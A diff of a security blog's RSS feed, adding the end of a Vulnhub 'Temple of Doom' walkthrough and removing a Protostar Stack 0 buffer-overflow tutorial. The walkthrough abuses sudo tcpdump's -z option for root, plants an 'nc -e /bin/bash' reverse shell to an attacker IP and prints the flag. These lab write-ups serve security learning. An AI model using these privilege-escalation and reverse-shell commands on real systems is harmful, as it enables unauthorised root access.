+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/exploit
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/exploit&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now We can execute it and see the results.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /dev/null &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; /tmp/exploit &lt;span class=&quot;nt&quot;&gt;-Z&lt;/span&gt; root
+&amp;lt;eth0 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /dev/null &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; /tmp/exploit &lt;span class=&quot;nt&quot;&gt;-Z&lt;/span&gt; root
+tcpdump: listening on eth0, link-type EN10MB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, capture size 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+10 packets received by filter
+0 packets dropped by kernel
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can use it to make another reverse shell (simply calling &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; didn’t work).&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nc -e /bin/bash 10.0.0.4 6666&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/exploit
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nc -e /bin/bash 10.0.0.4 6666&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/exploit
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /dev/null &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; /tmp/exploit &lt;span class=&quot;nt&quot;&gt;-Z&lt;/span&gt; root
+&amp;lt;eth0 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /dev/null &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; /tmp/exploit &lt;span class=&quot;nt&quot;&gt;-Z&lt;/span&gt; root
+tcpdump: listening on eth0, link-type EN10MB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, capture size 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+9 packets received by filter
+0 packets dropped by kernel&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And to the flag, here we go!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 6666
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 6666 ...
+10.0.0.5: inverse host lookup failed: Unknown host
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.5] 51622
+python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost fireman]# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 84
+dr-xr-x---. 10 root root  4096 Jun  7 23:12 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+dr-xr-xr-x. 18 root root  4096 May 30 18:43 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;   1 root root   130 Jun  7 23:21 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root    18 Feb  9 09:26 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   176 Feb  9 09:26 .bash_profile
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   176 Feb  9 09:26 .bashrc
+drwx------.  3 root root  4096 Jun  1 21:01 .cache
+drwxrwx---.  4 root root  4096 May 30 10:42 .config
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   100 Feb  9 09:26 .cshrc
+drwx------.  3 root root  4096 May 30 11:21 .dbus
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root    16 May 30 10:42 .esd_auth
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root  1993 Jun  7 23:16 flag.txt
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root 12288 Jun  3 18:18 .flag.txt.swp
+drwxr-xr-x   4 root root  4096 Jun  3 01:39 .forever
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;   1 root root  1389 Jun  2 19:47 .mysql_history
+drwxr-xr-x.  5 1000 1000  4096 May 30 17:37 .npm
+drwxr-----.  3 root root  4096 May 30 11:38 .pki
+drwxr-xr-x   2 root root  4096 Jun  1 23:29 .shadowsocks
+drwx------   2 root root  4096 Jun  7 22:33 .ssh
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root     0 May 30 11:21 .Xauthority
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] You&lt;span class=&quot;s1&quot;&gt;'re a soldier. 
+[+] One of the best that the world could set against
+[+] the demonic invasion.  
+
++-----------------------------------------------------------------------------+
+| |       |\                                           -~ /     \  /          |
+|~~__     | \                                         | \/       /\          /|
+|    --   |  \                                        | / \    /    \     /   |
+|      |~_|   \                                   \___|/    \/         /      |
+|--__  |   -- |\________________________________/~~\~~|    /  \     /     \   |
+|   |~~--__  |~_|____|____|____|____|____|____|/ /  \/|\ /      \/          \/|
+|   |      |~--_|__|____|____|____|____|____|_/ /|    |/ \    /   \       /   |
+|___|______|__|_||____|____|____|____|____|__[]/_|----|    \/       \  /      |
+|  \mmmm :   | _|___|____|____|____|____|____|___|  /\|   /  \      /  \      |
+|      B :_--~~ |_|____|____|____|____|____|____|  |  |\/      \ /        \   |
+|  __--P :  |  /                                /  /  | \     /  \          /\|
+|~~  |   :  | /                                 ~~~   |  \  /      \      /   |
+|    |      |/                        .-.             |  /\          \  /     |
+|    |      /                        |   |            |/   \          /\      |
+|    |     /                        |     |            -_   \       /    \    |
++-----------------------------------------------------------------------------+
+|          |  /|  |   |  2  3  4  | /~~~~~\ |       /|    |_| ....  ......... |
+|          |  ~|~ | % |           | | ~J~ | |       ~|~ % |_| ....  ......... |
+|   AMMO   |  HEALTH  |  5  6  7  |  \===/  |    ARMOR    |#| ....  ......... |
++-----------------------------------------------------------------------------+
+			
+		FLAG: kre0cu4jl4rzjicpo1i7z5l1     
+
+[+] Congratulations on completing this VM &amp;amp; I hope you enjoyed my first boot2root.
+
+[+] You can follow me on twitter: @0katz
+
+[+] Thanks to the homie: @Pink_P4nther&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+</description>
+        <pubDate>Fri, 20 Jul 2018 02:00:00 +0200</pubDate>
+        <link>http://localhost:4000/vulnhub-temple-of-doom/</link>
+        <guid isPermaLink="true">http://localhost:4000/vulnhub-temple-of-doom/</guid>
+      </item>
+    
+      <item>
         <title>Vulnhub.com - Toppo: 1</title>
         <description>&lt;p&gt;Today we’re going to work through easy machine from Vulnhub called &lt;strong&gt;&lt;em&gt;Toppo&lt;/em&gt;&lt;/strong&gt;. If you don’t have time, but still want to get these shells, just try this machine.&lt;/p&gt;
 
@@ -1848,194 +2328,6 @@ you have correctly got the variable to the right value&lt;/code&gt;&lt;/pre&gt;&
         <pubDate>Fri, 27 Apr 2018 02:00:00 +0200</pubDate>
         <link>http://localhost:4000/protostar-1/</link>
         <guid isPermaLink="true">http://localhost:4000/protostar-1/</guid>
-      </item>
-    
-      <item>
-        <title>Protostar - Stack 00</title>
-        <description>&lt;p&gt;Welcome to the first challenge from Protostar series brought to us by &lt;a href=&quot;https://exploit-exercises.com/&quot;&gt;Exploit Exercises&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
-
-&lt;p&gt;At first we are given a source code of the challenge.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-#include &amp;lt;stdio.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;modified&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;modified&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modified&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;you have changed the 'modified' variable&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Try again?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As we can see, our goal is to modify the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;modified&lt;/code&gt; variable, which is for now equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;. But before the declaration of this variable, we have a character buffer 64 elements in size.&lt;/p&gt;
-
-&lt;p&gt;Just after these two variables, we have &lt;code class=&quot;highlighter-rouge&quot;&gt;gets()&lt;/code&gt; function that will copy anything that we enter into the buffer. From &lt;code class=&quot;highlighter-rouge&quot;&gt;man&lt;/code&gt; pages, we can remeber that this function should not be used.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Never use gets().  Because it is impossible to tell without knowing the  data  in
-advance how many characters gets() will read, and because gets() will continue to
-store characters past the end of the buffer, it is extremely  dangerous  to  use.
-It has been used to break computer security.  Use fgets() instead.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;With that information, let’s jump and &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; into the the protostar machine.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh user@192.168.0.234                                                                
-
-
-    PPPP  RRRR   OOO  TTTTT  OOO   SSSS TTTTT   A   RRRR  
-    P   P R   R O   O   T   O   O S       T    A A  R   R
-    PPPP  RRRR  O   O   T   O   O  SSS    T   AAAAA RRRR  
-    P     R  R  O   O   T   O   O     S   T   A   A R  R  
-    P     R   R  OOO    T    OOO  SSSS    T   A   A R   R
-
-          http://exploit-exercises.com/protostar                                                 
-
-Welcome to Protostar. To log &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;, you may use the user / user account.
-When you need to use the root account, you can login as root / godmode.
-
-For level descriptions / further &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;, please see the above url.
-
-user@192.168.0.234&lt;span class=&quot;s1&quot;&gt;'s password:
-Linux (none) 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Mar 31 12:18:37 2018&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now let’s move into the directory containing challenge binaries.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /opt/protostar/bin/
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./stack0
-asd
-Try again?&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Here we can see how the program works in real sitation. It takes the input from the user, and as the &lt;code class=&quot;highlighter-rouge&quot;&gt;modified&lt;/code&gt; variable was not modified, it prints &lt;code class=&quot;highlighter-rouge&quot;&gt;Try again?&lt;/code&gt; string. But as we know that the &lt;code class=&quot;highlighter-rouge&quot;&gt;buffer&lt;/code&gt; can contain only &lt;code class=&quot;highlighter-rouge&quot;&gt;64&lt;/code&gt; elements, let’s print an absurd number of &lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt; letters passing them into the binary.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./stack0
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-you have changed the &lt;span class=&quot;s1&quot;&gt;'modified'&lt;/span&gt; variable
-Segmentation fault&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And here it is, we modified the &lt;code class=&quot;highlighter-rouge&quot;&gt;modified&lt;/code&gt; variable. But why did it happen? We can view the binary using tools such as &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; in order to see how their internal system works.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb ./stack0
-GNU gdb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GDB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 7.0.1-debian
-Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2009 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type &lt;span class=&quot;s2&quot;&gt;&quot;show copying&quot;&lt;/span&gt;
-and &lt;span class=&quot;s2&quot;&gt;&quot;show warranty&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details.
-This GDB was configured as &lt;span class=&quot;s2&quot;&gt;&quot;i486-linux-gnu&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-For bug reporting instructions, please see:
-&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;...
-Reading symbols from /opt/protostar/bin/stack0...done.
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;disassembly-flavor intel&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Firstly, we have to set the assembly syntax into the Intel one, as for me it’s easier to read. After that we’re ready to analyze the assembly code of the &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; function.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disas main
-Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
-0x080483f4 &amp;lt;main+0&amp;gt;:	push   ebp
-0x080483f5 &amp;lt;main+1&amp;gt;:	mov    ebp,esp
-0x080483f7 &amp;lt;main+3&amp;gt;:	and    esp,0xfffffff0
-0x080483fa &amp;lt;main+6&amp;gt;:	sub    esp,0x60
-0x080483fd &amp;lt;main+9&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x5c],0x0
-0x08048405 &amp;lt;main+17&amp;gt;:	lea    eax,[esp+0x1c]
-0x08048409 &amp;lt;main+21&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
-0x0804840c &amp;lt;main+24&amp;gt;:	call   0x804830c &amp;lt;gets@plt&amp;gt;
-0x08048411 &amp;lt;main+29&amp;gt;:	mov    eax,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x5c]
-0x08048415 &amp;lt;main+33&amp;gt;:	&lt;span class=&quot;nb&quot;&gt;test   &lt;/span&gt;eax,eax
-0x08048417 &amp;lt;main+35&amp;gt;:	je     0x8048427 &amp;lt;main+51&amp;gt;
-0x08048419 &amp;lt;main+37&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x8048500
-0x08048420 &amp;lt;main+44&amp;gt;:	call   0x804832c &amp;lt;puts@plt&amp;gt;
-0x08048425 &amp;lt;main+49&amp;gt;:	jmp    0x8048433 &amp;lt;main+63&amp;gt;
-0x08048427 &amp;lt;main+51&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x8048529
-0x0804842e &amp;lt;main+58&amp;gt;:	call   0x804832c &amp;lt;puts@plt&amp;gt;
-0x08048433 &amp;lt;main+63&amp;gt;:	leave  
-0x08048434 &amp;lt;main+64&amp;gt;:	ret    
-End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As we know that the buffer is getting overfilled just after the &lt;code class=&quot;highlighter-rouge&quot;&gt;gets()&lt;/code&gt; function, we can put a breakpoint just after this function at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x08048411&lt;/code&gt; address. That way, the flow of the program will stop and we will be able to freely look around registers and memory used at that particular moment.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x08048411
-Breakpoint 1 at 0x8048411: file stack0/stack0.c, line 13.
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r
-Starting program: /opt/protostar/bin/stack0
-aaaaaaaaaaaaaa
-
-Breakpoint 1, main &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1, &lt;span class=&quot;nv&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xbffffd64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at stack0/stack0.c:13
-13	stack0/stack0.c: No such file or directory.
-	&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;stack0/stack0.c&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;This time, I’m running the binary with small input, such that will not overfill the buffer. That will show you a difference between this run, and run using large input.&lt;/p&gt;
-
-&lt;p&gt;Together with the fact that the variables are stored in stack, we will have to view it. In order to do it, we can use this command &lt;code class=&quot;highlighter-rouge&quot;&gt;x/40x $esp&lt;/code&gt;. Let’s analyze it. Letters &lt;code class=&quot;highlighter-rouge&quot;&gt;x&lt;/code&gt; means that the output will be printed in the hexadecimal format, &lt;code class=&quot;highlighter-rouge&quot;&gt;40&lt;/code&gt; is the number of elements that we want to print and &lt;code class=&quot;highlighter-rouge&quot;&gt;$esp&lt;/code&gt; is the name of the register we want to use.&lt;/p&gt;
-
-&lt;p&gt;But why &lt;code class=&quot;highlighter-rouge&quot;&gt;ESP&lt;/code&gt; register? Simply because it stores the address of the most recent value pushed on the stack, which in our case are the variables.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/40x &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
-  0xbffffc50:	0xbffffc6c	0x00000001	0xb7fff8f8	0xb7f0186e
-  0xbffffc60:	0xb7fd7ff4	0xb7ec6165	0xbffffc78	0x61616161
--&amp;gt;0xbffffc70:	0x61616161	0x61616161	0xbf006161	0x080482e8
-  0xbffffc80:	0xb7ff1040	0x08049620	0xbffffcb8	0x08048469
-  0xbffffc90:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffffcb8
--&amp;gt;0xbffffca0:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
-  0xbffffcb0:	0x08048450	0x00000000	0xbffffd38	0xb7eadc76
-  0xbffffcc0:	0x00000001	0xbffffd64	0xbffffd6c	0xb7fe1848
-  0xbffffcd0:	0xbffffd20	0xffffffff	0xb7ffeff4	0x0804824b
-  0xbffffce0:	0x00000001	0xbffffd20	0xb7ff0626	0xb7fffab0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
